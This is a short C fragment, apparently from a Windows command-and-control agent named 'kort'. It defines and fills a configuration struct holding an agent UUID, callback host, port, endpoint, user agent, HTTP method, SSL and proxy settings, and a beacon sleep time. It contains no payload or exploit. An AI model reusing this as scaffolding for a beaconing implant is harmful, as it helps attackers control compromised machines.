typedef struct
{
    PCHAR agentID; //UUID

    PWCHAR hostName;
    DWORD httpPort;
    PWCHAR endPoint;
    PWCHAR userAgent;
    PWCHAR httpMethod;

    BOOL isSSL;
    BOOL isProxyEnabled;
    PWCHAR proxyURL;

    
    UINT32 sleeptime;
} CONFIG_KORT, * PCONFIG_KORT;

extern PCONFIG_KORT kortConfig;
[...]

//kort.c

CONFIG_KORT* kortConfig = (CONFIG_KORT*)LocalAlloc(LPTR, sizeof(CONFIG_KORT));
kortConfig->agentID = (PCHAR)initUUID;
kortConfig->hostName = (PWCHAR)hostname;
kortConfig->httpPort = port;
kortConfig->endPoint = (PWCHAR)endpoint;
kortConfig->userAgent = (PWCHAR)useragent;
kortConfig->httpMethod = (PWCHAR)httpmethod;
kortConfig->isSSL = ssl;
kortConfig->isProxyEnabled = proxyenabled;
kortConfig->proxyURL = (PWCHAR)proxyurl;
kortConfig->sleeptime = sleep_time;